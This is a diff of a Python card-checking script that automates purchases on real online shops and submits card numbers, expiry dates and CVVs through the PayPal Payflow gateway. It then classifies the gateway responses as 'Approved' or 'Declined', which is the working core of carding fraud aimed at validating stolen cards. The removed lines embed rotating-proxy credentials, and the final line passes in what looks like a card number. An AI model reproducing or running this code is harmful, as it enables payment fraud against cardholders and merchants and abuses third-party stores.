@@ -6,6 +6,8 @@ from dataclasses import dataclass
 import requests
 import uuid
 from fake_useragent import UserAgent
+from bs4 import BeautifulSoup
+
 class ConfigsPAge:
     @classmethod
     def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):
@@ -37,265 +39,141 @@ class payflow_pro:
             if self.ccs[0].startswith("3"): self.brand = "AE"
             elif self.ccs[0].startswith("5"): self.brand = "MC"
             session = requests.Session()
-            session.proxies = {"http":"http://mfqmytsx-rotate:fvztryjsvwhy@p.webshare.io:80","https":"http://mfqmytsx-rotate:fvztryjsvwhy@p.webshare.io:80"}
+
             Agent = UserAgent().random
             guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
             muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
             sid = str(uuid.uuid4()).replace('-', '') + '438b7a'
+            
             headers = {
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'accept-language': 'es-ES,es;q=0.5',
-                'cache-control': 'max-age=0',
-                'priority': 'u=0, i',
-                'referer': 'https://ledradiant.com/led-lights/led-rope-stripe-accessorie',
-                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'sec-gpc': '1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': Agent,
-                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; cf_clearance=F06RAU5O6EqGFaeFRFxuyFa_Dje6Y4ah_J8CGOsN0bM-1772247337-1.2.1.1-71spSi1ucbyjKnoICGNtHuMuDlYUQvovXXCfVfgy1SBmgmQMPfNpt82VfE7BSHV8SqADY_wL46uVm5rd46GiEc5XX24w6MSb.unLZJXlQD7GQMgYC5mjx9R4qXVorq27ipqc3nZvBquHcBMQVtdWqHx8FBM5.la9MVvpMTI3Ws4AKjm4sQx0EiYODefaqZXOCXDHqf1Z7nS7gnn61B69y17_fIzJjg9AGve478aLB1k; popup_ids=6a973g=1772247425.864; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A%7CcartSubtotal%3A0%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1',
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "es-ES,es;q=0.8",
+                "Referer": "https://www.funkyfriendsfactory.com/",
             }
 
-            response = session.get(
-                'https://ledradiant.com/2-4-watt-p-feet-led-strip-ropelight-1-ft-multicolor-rgb-70-lm-p-watt',
-            
-                headers=headers,
-            )
+            response = session.get('https://www.funkyfriendsfactory.com/maximus-mouse-sewing-pattern', headers=headers).text
+            form_key = re.search(r'form_key/([^/]+)', response).group(1)
+            if "form_key" not in response:
+                print("NO SESSION VALID")
             headers = {
-                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
-                'accept-language': 'es-ES,es;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://ledradiant.com',
-                'priority': 'u=1, i',
-                'referer': 'https://ledradiant.com/2-4-watt-p-feet-led-strip-ropelight-1-ft-multicolor-rgb-70-lm-p-watt',
-                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'sec-gpc': '1',
-                'user-agent': Agent,
-                'x-prototype-version': '1.7',
-                'x-requested-with': 'XMLHttpRequest',
-                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; cf_clearance=F06RAU5O6EqGFaeFRFxuyFa_Dje6Y4ah_J8CGOsN0bM-1772247337-1.2.1.1-71spSi1ucbyjKnoICGNtHuMuDlYUQvovXXCfVfgy1SBmgmQMPfNpt82VfE7BSHV8SqADY_wL46uVm5rd46GiEc5XX24w6MSb.unLZJXlQD7GQMgYC5mjx9R4qXVorq27ipqc3nZvBquHcBMQVtdWqHx8FBM5.la9MVvpMTI3Ws4AKjm4sQx0EiYODefaqZXOCXDHqf1Z7nS7gnn61B69y17_fIzJjg9AGve478aLB1k; popup_ids=6a973g=1772247425.864; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A%7CcartSubtotal%3A0%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1',
+                "User-Agent": headers["User-Agent"],
+                "Accept": "*/*",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest",
+                "Origin": "https://www.funkyfriendsfactory.com",
+                "Referer": "https://www.funkyfriendsfactory.com/maximus-mouse-sewing-pattern",
             }
 
             data = {
-                'product': '1930',
-                'related_product': '',
+                'product': '568',
                 'qty': '1',
+                'ajax_package_name': 'default',
+                'ajax_layout': 'orangemantra',
+                'ajax_template': 'orangemantra',
+                'ajax_skin': 'orangemantra',
             }
 
             response = session.post(
-                'https://ledradiant.com/mdlajaxcheckout/index/cart/cart/add/uenc/aHR0cHM6Ly9sZWRyYWRpYW50LmNvbS8yLTQtd2F0dC1wLWZlZXQtbGVkLXN0cmlwLXJvcGVsaWdodC0xLWZ0LW11bHRpY29sb3ItcmdiLTcwLWxtLXAtd2F0dA,,/product/1930/form_key/cDVF2w5dPHihbqKa/',
-            
-                headers=headers,
-                data=data,
-            ).cookies
-            print(response)
-            
-            headers = {
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'accept-language': 'es-ES,es;q=0.5',
-                'priority': 'u=0, i',
-                'referer': 'https://ledradiant.com/2-4-watt-p-feet-led-strip-ropelight-1-ft-multicolor-rgb-70-lm-p-watt',
-                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'sec-gpc': '1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': Agent,
-                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; cf_clearance=F06RAU5O6EqGFaeFRFxuyFa_Dje6Y4ah_J8CGOsN0bM-1772247337-1.2.1.1-71spSi1ucbyjKnoICGNtHuMuDlYUQvovXXCfVfgy1SBmgmQMPfNpt82VfE7BSHV8SqADY_wL46uVm5rd46GiEc5XX24w6MSb.unLZJXlQD7GQMgYC5mjx9R4qXVorq27ipqc3nZvBquHcBMQVtdWqHx8FBM5.la9MVvpMTI3Ws4AKjm4sQx0EiYODefaqZXOCXDHqf1Z7nS7gnn61B69y17_fIzJjg9AGve478aLB1k; popup_ids=6a973g=1772247425.864; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1; popupData=magentoSessionId%3A%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A1930%7CcartSubtotal%3A1.15%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0',
-            }
+                f'https://www.funkyfriendsfactory.com/ajaxcart/cart/add/uenc/aHR0cHM6Ly93d3cuZnVua3lmcmllbmRzZmFjdG9yeS5jb20vbWF4aW11cy1tb3VzZS1zZXdpbmctcGF0dGVybg,,/product/568/form_key/{form_key}/',
 
-            response = session.get('https://ledradiant.com/checkout/cart/',  headers=headers).text
-            form_k = ConfigsPAge().QueryText(response, 'name="form_key" type="hidden" value="', '"')
-            print(form_k)
-                
-            headers = {
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'accept-language': 'es-ES,es;q=0.5',
-                'priority': 'u=0, i',
-                'referer': 'https://ledradiant.com/checkout/cart/',
-                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'sec-gpc': '1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': Agent,
-                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; cf_clearance=F06RAU5O6EqGFaeFRFxuyFa_Dje6Y4ah_J8CGOsN0bM-1772247337-1.2.1.1-71spSi1ucbyjKnoICGNtHuMuDlYUQvovXXCfVfgy1SBmgmQMPfNpt82VfE7BSHV8SqADY_wL46uVm5rd46GiEc5XX24w6MSb.unLZJXlQD7GQMgYC5mjx9R4qXVorq27ipqc3nZvBquHcBMQVtdWqHx8FBM5.la9MVvpMTI3Ws4AKjm4sQx0EiYODefaqZXOCXDHqf1Z7nS7gnn61B69y17_fIzJjg9AGve478aLB1k; popup_ids=6a973g=1772247425.864; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A1930%7CcartSubtotal%3A1.15%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0',
-            }
-
-            response = session.get('https://ledradiant.com/onepagecheckout/',  headers=headers)
-
-            headers = {
-                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
-                'accept-language': 'es-ES,es;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://ledradiant.com',
-                'priority': 'u=1, i',
-                'referer': 'https://ledradiant.com/onepagecheckout/',
-                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'sec-gpc': '1',
-                'user-agent': Agent,
-                'x-prototype-version': '1.7',
-                'x-requested-with': 'XMLHttpRequest',
-                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; popup_ids=6a973g=1772247425.864; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A1930%7CcartSubtotal%3A1.15%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0; cf_clearance=cWjkQmjqxzD63pDJJ5CYqUuJwGtDZuoVetFVb6DE81U-1772248083-1.2.1.1-X5YL5MOy_o2hZdanP2FiKtcFaKYxNFkf965OMQmnHkjIc8STQE.Id4XjuJ9qtxV_QbwsMPm5gBqIZ6tJcgD0UPcVfKi3yo9AHLotNGWlWdJWB_Fzk0OBAMa9YkvvNh_VteJ_slHpAhZSQ.8YhpsbHm1epu7h7NnMISGIsYOz7QwAcCRNXGQPtEgGTfCskFylkUKhQ0o6ODnH56j9FTJA3pdVyzcDC_6u7zguIg3bGEo',
-            }
-
-            data = {
-                'billing[address_id]': '42719',
-                'billing[firstname]': 'ldfl',
-                'billing[lastname]': 'dsdasd',
-                'billing[email]': 'banes42563@rohoza.com',
-                'billing[company]': 'ggd',
-                'billing[street][]': [
-                    'moall del sol',
-                    'sadw',
-                ],
-                'billing[city]': 'guayas',
-                'billing[region_id]': '43',
-                'billing[region]': '',
-                'billing[postcode]': '10080',
-                'billing[telephone]': '0989861371',
-                'billing[country_id]': 'US',
-                'billing[taxvat]': '0989861371',
-                'billing[customer_password]': '',
-                'billing[confirm_password]': '',
-                'billing[save_in_address_book]': '1',
-                'billing[use_for_shipping]': '1',
-                'shipping[same_as_billing]': '1',
-                'shipping[address_id]': '42719',
-                'shipping[firstname]': 'ldfl',
-                'shipping[lastname]': 'dsdasd',
-                'shipping[company]': 'ggd',
-                'shipping[street][]': [
-                    'moall del sol',
-                    'sadw',
-                ],
-                'shipping[city]': 'guayas',
-                'shipping[region_id]': '43',
-                'shipping[region]': '',
-                'shipping[postcode]': '10080',
-                'shipping[telephone]': '0989861371',
-                'shipping[country_id]': 'US',
-                'shipping[save_in_address_book]': '1',
-                'shipping_method': 'freeshipping_freeshipping',
-                'payment[method]': 'paypal_direct',
-                'payment[cc_type]': self.brand,
-                'payment[cc_number]': self.ccs[0],
-                'payment[cc_exp_month]': self.ccs[1],
-                'payment[cc_exp_year]': self.ccs[2],
-                'payment[cc_cid]': self.ccs[3],
-                'process_coupon': '0',
-                'coupon[remove]': '0',
-                'coupon[code]': '',
-                'order-comment': '',
-                'newsletter': '1',
-                'review': '1',
-            }
-
-            response = session.post(
-                'https://ledradiant.com/onepagecheckout/index/updateCheckout/',
-            
                 headers=headers,
                 data=data,
             )
+            cart = session.get("https://www.funkyfriendsfactory.com/checkout/cart/").text
+
+            print("ITEM IN CART:", "Maximus Mouse" in cart or "537671" in cart)
+
             headers = {
-                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
-                'accept-language': 'es-ES,es;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://ledradiant.com',
-                'priority': 'u=1, i',
-                'referer': 'https://ledradiant.com/onepagecheckout/',
-                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'sec-gpc': '1',
-                'user-agent': Agent,
-                'x-prototype-version': '1.7',
-                'x-requested-with': 'XMLHttpRequest',
-                # 'cookie': 'frontend=0ap5oovgjpm36ek6v1lq9sspv5; frontend_cid=fjPY32ZRUQbhCQDW; popup_ids=6a973g=1772247425.864; FPC_PRODUCT_VIEWED=1930%2C; external_no_cache=1; popupData=magentoSessionId%3A0ap5oovgjpm36ek6v1lq9sspv5%7ClastSession%3A0ap5oovgjpm36ek6v1lq9sspv5%7CcartProductIds%3A1930%7CcartSubtotal%3A1.15%7CcustomerGroupId%3A0%7CloggedIn%3A0%7CisSubscribed%3A%7CpendingOrder%3A0; cf_clearance=cWjkQmjqxzD63pDJJ5CYqUuJwGtDZuoVetFVb6DE81U-1772248083-1.2.1.1-X5YL5MOy_o2hZdanP2FiKtcFaKYxNFkf965OMQmnHkjIc8STQE.Id4XjuJ9qtxV_QbwsMPm5gBqIZ6tJcgD0UPcVfKi3yo9AHLotNGWlWdJWB_Fzk0OBAMa9YkvvNh_VteJ_slHpAhZSQ.8YhpsbHm1epu7h7NnMISGIsYOz7QwAcCRNXGQPtEgGTfCskFylkUKhQ0o6ODnH56j9FTJA3pdVyzcDC_6u7zguIg3bGEo',
+                "User-Agent": headers["User-Agent"],
+                "Accept": "*/*",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest",
+                "Origin": "https://www.funkyfriendsfactory.com",
+                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
+            }
+
+            response = session.get('https://www.funkyfriendsfactory.com/checkout/cart/',  headers=headers)
+
+            headers = {
+                "User-Agent": headers["User-Agent"],
+                "Accept": "*/*",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest",
+                "Origin": "https://www.funkyfriendsfactory.com",
+                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
+            }
+
+            response = session.get('https://www.funkyfriendsfactory.com/onestepcheckout/index/', headers=headers)
+
+            print("shipping_method" in session.get("https://www.funkyfriendsfactory.com/onestepcheckout/index/").text.lower())
+            headers = {
+                "User-Agent": headers["User-Agent"],
+                "Accept": "*/*",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest",
+                "Origin": "https://www.funkyfriendsfactory.com",
+                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
             }
 
             data = {
-                'billing[address_id]': '42719',
+                'billing[address_id]': '693175',
                 'billing[firstname]': 'ldfl',
                 'billing[lastname]': 'dsdasd',
-                'billing[email]': 'banes42563@rohoza.com',
-                'billing[company]': 'ggd',
+                'billing[email]': self.main,
                 'billing[street][]': [
                     'moall del sol',
                     'sadw',
                 ],
-                'billing[city]': 'guayas',
+                'billing[country_id]': 'US',
+                'billing[city]': 'Miami',
+                'billing[postcode]': '34112',
                 'billing[region_id]': '43',
                 'billing[region]': '',
-                'billing[postcode]': '10080',
-                'billing[telephone]': '0989861371',
-                'billing[country_id]': 'US',
-                'billing[taxvat]': '0989861371',
-                'billing[customer_password]': '',
-                'billing[confirm_password]': '',
+                'billing[customer_password]': 'leito132asd',
+                'billing[confirm_password]': 'leito132asd',
                 'billing[save_in_address_book]': '1',
                 'billing[use_for_shipping]': '1',
-                'shipping[same_as_billing]': '1',
-                'shipping[address_id]': '42719',
-                'shipping[firstname]': 'ldfl',
-                'shipping[lastname]': 'dsdasd',
-                'shipping[company]': 'ggd',
-                'shipping[street][]': [
-                    'moall del sol',
-                    'sadw',
-                ],
-                'shipping[city]': 'guayas',
-                'shipping[region_id]': '43',
-                'shipping[region]': '',
-                'shipping[postcode]': '10080',
-                'shipping[telephone]': '0989861371',
-                'shipping[country_id]': 'US',
-                'shipping[save_in_address_book]': '1',
-                'shipping_method': 'flatrate_flatrate',
+                'emailvalid': 'valid',
                 'payment[method]': 'paypal_direct',
                 'payment[cc_type]': self.brand,
                 'payment[cc_number]': self.ccs[0],
                 'payment[cc_exp_month]': self.ccs[1],
                 'payment[cc_exp_year]': self.ccs[2],
                 'payment[cc_cid]': self.ccs[3],
-                'process_coupon': '0',
-                'coupon[remove]': '0',
-                'coupon[code]': '',
-                'order-comment': '',
-                'newsletter': '1',
+                'qty-item-537671': '1',
+                'remove': '0',
+                'coupon_code': '',
+                'terms_conditions_checkbox': '1',
             }
 
-            response = session.post('https://ledradiant.com/onepagecheckout/index/saveOrder/', headers=headers, data=data).text
-            error = ConfigsPAge().QueryText(response, '"error_messages":"PayPal gateway has rejected request.','"')
-            print(error)
+            r = session.post(
+                "https://www.funkyfriendsfactory.com/onestepcheckout/index/saveOrder/",
+                headers=headers,
+                data=data
+            )
 
-            if 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number (#15004: Gateway Decline).' in error: return 'Approved! ✅', error
-            else: return 'Dead! ❌', error
-        except: return 'Dead! ❌','This transaction cannot be processed (#15005: Processor Decline).'
-print(payflow_pro().main('4563310041475116|11|2027|692'))
+            soup = BeautifulSoup(r.text, "html.parser")
+
+            error = soup.find(class_="error-msg")
+
+            mensaje = None
+
+            if error:
+                mensaje = error.get_text(" ", strip=True)
+
+            if mensaje is None:
+                return 'Approved! ✅', 'Charged $10.21'
+
+            elif 'Please enter a valid Credit Card Verification Number' in mensaje:
+                return 'Approved! ✅', 'CVV2 Mismatch: 15004'
+
+            elif '#15005' in mensaje:
+                return 'Declined! ❌', '15005 Processor Decline'
+
+            else:
+                return 'Declined! ❌', mensaje
+
+        except Exception as e:
+            return 'Declined! ❌', f'error gate: {e}'
+print(payflow_pro().main('4110905024362674|09|2029|125'))
